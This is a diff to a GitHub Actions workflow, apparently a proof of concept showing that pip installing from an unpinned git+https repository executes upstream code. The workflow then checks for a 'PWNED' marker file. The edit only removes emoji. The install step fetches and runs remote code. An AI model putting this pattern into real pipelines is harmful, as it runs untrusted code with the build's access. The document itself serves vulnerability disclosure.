@@ -5,26 +5,26 @@ on:
 
 jobs:
   poc-vcs-rce:
-    name: 🔓 PoC: Unpinned VCS executes upstream code
+    name: PoC - Unpinned VCS executes upstream code
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - uses: actions/setup-python@v6
         with:
           python-version: '3.11'
-      - name: 📦 Install from unpinned VCS (vulnerable)
+      - name: Install from unpinned VCS (vulnerable)
         run: |
           echo "Installing from unpinned git+https:// URL..."
           python3 -m pip install -U "git+https://github.com/reconsumeralization/tfdocs-poc-20250922181610"
-      - name: 🎯 Verify PoC execution marker
+      - name: Verify PoC execution marker
         run: |
           echo "Checking for execution marker..."
           ls -la
           if test -f PWNED_FROM_VCS.txt; then
-            echo "✅ [POC SUCCESS] Upstream code executed!"
-            echo "📄 Marker contents:"
+            echo "[POC SUCCESS] Upstream code executed!"
+            echo "Marker contents:"
             cat PWNED_FROM_VCS.txt
           else
-            echo "❌ [POC FAILED] No marker found"
+            echo "[POC FAILED] No marker found"
             exit 1
           fi
